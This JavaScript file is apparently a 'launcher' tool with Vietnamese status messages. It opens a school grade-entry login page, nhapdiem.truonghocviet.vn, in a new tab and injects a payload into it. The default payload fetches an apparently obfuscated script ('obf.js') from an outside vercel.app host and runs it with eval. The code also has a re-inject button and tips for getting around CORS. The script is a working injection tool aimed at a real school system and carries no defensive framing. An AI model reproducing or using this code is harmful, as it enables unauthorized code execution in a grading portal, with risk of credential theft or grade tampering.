// ============================================================
// NT4NH2 // LAUNCHER SCRIPT (FIXED CORS & PATH)
// ============================================================

const DEFAULT_CONFIG = {
  targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
  payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
  delay: 3000,
  title: "Launcher Tool",
  bg: "#0d1117",
  text: "#c9d1d9"
};

function loadConfig() {
  const raw = localStorage.getItem("launcher_config");
  if (!raw) return { ...DEFAULT_CONFIG };
  try { return { ...DEFAULT_CONFIG, ...JSON.parse(raw) }; }
  catch (e) { return { ...DEFAULT_CONFIG }; }
}

function saveConfig(cfg) {
  localStorage.setItem("launcher_config", JSON.stringify(cfg));
}

let CONFIG = loadConfig();

function applyWebSettings() {
  document.title = CONFIG.title;
  document.body.style.background = CONFIG.bg;
  document.body.style.color = CONFIG.text;
}

const btnLaunch     = document.getElementById("btnLaunch");
const btnSettingTool= document.getElementById("btnSettingTool");
const btnSettingWeb = document.getElementById("btnSettingWeb");
const statusEl      = document.getElementById("status");

const popup         = document.getElementById("popup");
const btnReinject   = document.getElementById("btnReinject");
const btnClose      = document.getElementById("btnClose");

const settingTool   = document.getElementById("settingTool");
const inpTargetUrl  = document.getElementById("inpTargetUrl");
const inpPayload    = document.getElementById("inpPayload");
const inpDelay      = document.getElementById("inpDelay");
const btnSaveTool   = document.getElementById("btnSaveTool");
const btnCloseTool  = document.getElementById("btnCloseTool");

const settingWeb    = document.getElementById("settingWeb");
const inpTitle      = document.getElementById("inpTitle");
const inpBg         = document.getElementById("inpBg");
const inpText       = document.getElementById("inpText");
const btnSaveWeb    = document.getElementById("btnSaveWeb");
const btnCloseWeb   = document.getElementById("btnCloseWeb");

let toolWindow = null;
let watchTimer = null;
let popupShown = false;

function setStatus(msg) {
  statusEl.textContent = "Trạng thái: " + msg;
}

function launchTool() {
  popupShown = false;
  setStatus("Đang mở URL đích...");

  // Mở tab mới
  toolWindow = window.open(CONFIG.targetUrl, "_blank");

  if (!toolWindow) {
    setStatus("Popup bị chặn. Vui lòng cho phép popup!");
    return;
  }

  // Chờ trang tải xong rồi inject
  setTimeout(() => {
    try {
      // Sử dụng eval trên window của tab mới
      toolWindow.eval(CONFIG.payload);
      setStatus("Đã inject payload. Đang giám sát...");
    } catch (e) {
      // Cảnh báo lỗi CORS (thường gặp nếu khác domain)
      console.error("Lỗi Inject: ", e);
      setStatus("Lỗi Inject (CORS). Hãy chắc chắn bạn đang chạy tool trên cùng domain hoặc dùng Extension.");
    }
    startWatch();
  }, CONFIG.delay);
}

function startWatch() {
  stopWatch();
  watchTimer = setInterval(() => {
    if (!toolWindow || toolWindow.closed) {
      stopWatch();
      onToolClosed();
    }
  }, 1000);
}

function stopWatch() {
  if (watchTimer) { clearInterval(watchTimer); watchTimer = null; }
}

function onToolClosed() {
  setStatus("Tool đã ngắt.");
  if (!popupShown) {
    popupShown = true;
    popup.classList.remove("hidden");
  }
}

btnLaunch.addEventListener("click", launchTool);

btnSettingTool.addEventListener("click", () => {
  inpTargetUrl.value = CONFIG.targetUrl;
  inpPayload.value   = CONFIG.payload;
  inpDelay.value     = CONFIG.delay;
  settingTool.classList.remove("hidden");
});

btnSettingWeb.addEventListener("click", () => {
  inpTitle.value = CONFIG.title;
  inpBg.value    = CONFIG.bg;
  inpText.value  = CONFIG.text;
  settingWeb.classList.remove("hidden");
});

btnSaveTool.addEventListener("click", () => {
  CONFIG.targetUrl = inpTargetUrl.value.trim();
  CONFIG.payload   = inpPayload.value.trim();
  CONFIG.delay     = parseInt(inpDelay.value) || 3000;
  saveConfig(CONFIG);
  settingTool.classList.add("hidden");
  setStatus("Đã lưu setting tool.");
});

btnSaveWeb.addEventListener("click", () => {
  CONFIG.title = inpTitle.value.trim() || "Launcher Tool";
  CONFIG.bg    = inpBg.value;
  CONFIG.text  = inpText.value;
  saveConfig(CONFIG);
  applyWebSettings();
  settingWeb.classList.add("hidden");
  setStatus("Đã lưu setting web.");
});

btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));

btnReinject.addEventListener("click", () => {
  popup.classList.add("hidden");
  launchTool();
});

btnClose.addEventListener("click", () => {
  popup.classList.add("hidden");
  setStatus("Đã hủy inject lại.");
});

applyWebSettings();
setStatus("Sẵn sàng.");
